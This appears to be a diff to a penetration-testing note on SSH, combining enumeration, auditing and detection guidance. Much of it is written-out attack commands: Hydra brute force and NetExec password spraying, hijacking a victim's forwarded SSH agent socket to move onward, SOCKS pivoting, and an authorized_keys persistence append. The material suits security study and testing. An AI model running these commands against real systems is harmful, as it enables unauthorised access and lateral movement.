@@ -1,3 +1,5 @@
+# SSH
+
 #SSH #SecureShell #remoteaccess
 
 ## What is SSH?
@@ -6,6 +8,23 @@ Secure Shell — encrypted protocol for remote command execution, file transfer 
 - Port **TCP 22** — SSH (default)
 - SSH-1 (deprecated, MITM vulnerable) vs SSH-2 (secure, current standard)
 - Requires SSH server running on target (OpenSSH sshd)
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|NMAP]] | `ssh-auth-methods`, `ssh-hostkey`, `ssh2-enum-algos`, `ssh-brute` NSE |
+| [[Tools/Network/ssh-audit\|ssh-audit]] | Unauth algorithm/vuln audit (weak ciphers, Terrapin) |
+| [[Tools/Auth/Hydra\|Hydra]] | Password brute (`ssh://`) |
+| [[Tools/Auth/Medusa\|Medusa]] | Password brute (`-M ssh`) |
+| [[Tools/Lateral Movement/NetExec\|NetExec]] | `nxc ssh` spray + `--key-file`/`--sudo-check` |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `ssh_login`/`ssh_enumusers` modules |
+| [[Tools/Auth/john the ripper\|John]] | `ssh2john` → crack private-key passphrase |
+| [[Tools/Auth/hashcat\|hashcat]] | Crack key passphrase (`-m 229x1`, cipher-dependent) |
+| [[Tools/Remote Access/Proxychains\|Proxychains]] | Route tools through an SSH SOCKS pivot |
+| [[Tools/Remote Access/Netcat\|Netcat]] | Banner grab on 22 |
 
 ---
 
@@ -32,11 +51,12 @@ Secure Shell — encrypted protocol for remote command execution, file transfer 
 | Private key | `~/.ssh/id_rsa` (or `id_ed25519`) | Client private key |
 | Public key | `~/.ssh/id_rsa.pub` | Client public key |
 
-### Dangerous Settings
+## Dangerous Settings
 
 | Setting | Risk |
 |---|---|
 | `PasswordAuthentication yes` | Brute force / credential attacks |
+| `ForwardAgent yes` (client) | Agent-forwarding hijack from a compromised hop (see Attack Vectors) |
 | `PermitEmptyPasswords yes` | No password required |
 | `PermitRootLogin yes` | Direct root access via SSH |
 | `Protocol 1` | Vulnerable SSH-1 in use |
@@ -59,9 +79,11 @@ nmap -p 22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos -sV <target>
 nc -nv <target> 22
 ssh -V
 
-# ssh-audit (comprehensive security audit)
+# ssh-audit (comprehensive security audit — weak algos + named CVEs)
 ssh-audit <target>
 python3 ssh-audit.py <target>
+# Flags Terrapin (CVE-2023-48795, prefix-truncation MITM) on OpenSSH < 9.6 /
+# when a vulnerable ChaCha20-Poly1305 or CBC-EtM cipher is negotiated
 
 # Identify supported auth methods
 ssh -v user@<target> 2>&1 | grep "Authentications that can continue"
@@ -157,7 +179,7 @@ ssh -D 9050 -fN -o StrictHostKeyChecking=no user@<pivot_host>
 
 # 3. Route tools through the proxy
 proxychains nmap -sT -Pn -p 22,80,443 <internal_target>
-proxychains crackmapexec smb <internal_target>
+proxychains nxc smb <internal_target>          # NetExec (crackmapexec is abandoned)
 proxychains evil-winrm -i <internal_target> -u user -p pass
 proxychains curl http://<internal_target>/
 proxychains firefox &  # browse internal sites
@@ -189,6 +211,22 @@ set RHOSTS <target>
 set USER_FILE users.txt
 set PASS_FILE passwords.txt
 run
+
+# NetExec — spray creds or a key across a range; --sudo-check flags where you can escalate
+nxc ssh <target-range> -u users.txt -p 'Autumn2026!' --continue-on-success
+nxc ssh <target> -u <user> --key-file id_rsa --sudo-check
+```
+
+### SSH Agent Hijacking (ForwardAgent Abuse)
+
+If a user SSHes into a box you control with **agent forwarding on** (`ForwardAgent yes` / `ssh -A`), their agent socket lives on your box while they're connected — and root (or you, if you own the socket) can use their loaded keys to authenticate onward as them, without ever seeing the key material.
+
+```bash
+# On the compromised hop — find live forwarded agent sockets
+ls -l /tmp/ssh-*/agent.*                       # one per active forwarded session
+SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh-add -l   # list the victim's loaded keys
+# Use them to jump onward as the victim (no passphrase, no key file)
+SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh <victim>@<next-internal-host>
 ```
 
 ### Key-Based Attack (Weak Key / Stolen Key)
@@ -254,6 +292,16 @@ cat ~/.ssh/id_rsa.pub | ssh user@<target> "mkdir -p ~/.ssh && cat >> ~/.ssh/auth
 
 ---
 
+## Detection & Artefacts
+
+- **auth.log / journald:** successful password login = `Accepted password for <user> from <ip>`; key login = `Accepted publickey ... key SHA256:<fp>` — the key fingerprint ties the session to a specific `authorized_keys` entry. Brute force = a flood of `Failed password` / `Invalid user` from one source; `PreferredAuthentications=none` probing shows as immediate disconnects.
+- **Persistence IOC:** a new line in `~/.ssh/authorized_keys` (especially for root/service accounts) is the classic SSH backdoor — diff it against a known-good baseline; watch file-integrity events on `authorized_keys`.
+- **Agent-hijack tell:** onward logins whose `authorized_keys` fingerprint belongs to a user who is *currently logged into a different host* (their agent was forwarded) — the source IP is the hop, not the key owner's workstation.
+- **Tunneling/pivot:** long-lived sshd sessions with `-D`/`-L`/`-R` show up as sshd children bound to loopback/high ports; SOCKS pivots generate outbound connections from the pivot to many internal hosts over one SSH session.
+- **Weak posture (report, not detect):** `ssh-audit`/`ssh2-enum-algos` output — SSH-1 enabled, CBC/RC4 ciphers, Terrapin-vulnerable cipher, `PermitRootLogin yes`, `PasswordAuthentication yes` on an internet-facing host.
+
+---
+
 ## Quick Reference
 
 | Goal | Command |
@@ -263,7 +311,9 @@ cat ~/.ssh/id_rsa.pub | ssh user@<target> "mkdir -p ~/.ssh && cat >> ~/.ssh/auth
 | Legacy algorithms | `ssh user@host -oHostKeyAlgorithms=+ssh-rsa` |
 | Test auth methods | `ssh -v user@host -o PreferredAuthentications=none` |
 | Brute force | `hydra -L users.txt -P rockyou.txt ssh://host` |
+| Spray + sudo-check | `nxc ssh range -u users.txt -p 'Pass!' --sudo-check` |
 | Crack key passphrase | `ssh2john key > hash; john hash --wordlist=rockyou.txt` |
+| Agent hijack | `SSH_AUTH_SOCK=/tmp/ssh-*/agent.* ssh victim@next-host` |
 | Local port forward | `ssh -L local_port:remote_host:remote_port user@host` |
 | Dynamic SOCKS proxy | `ssh -D 1080 user@host` |
 | SSH audit | `ssh-audit host` |
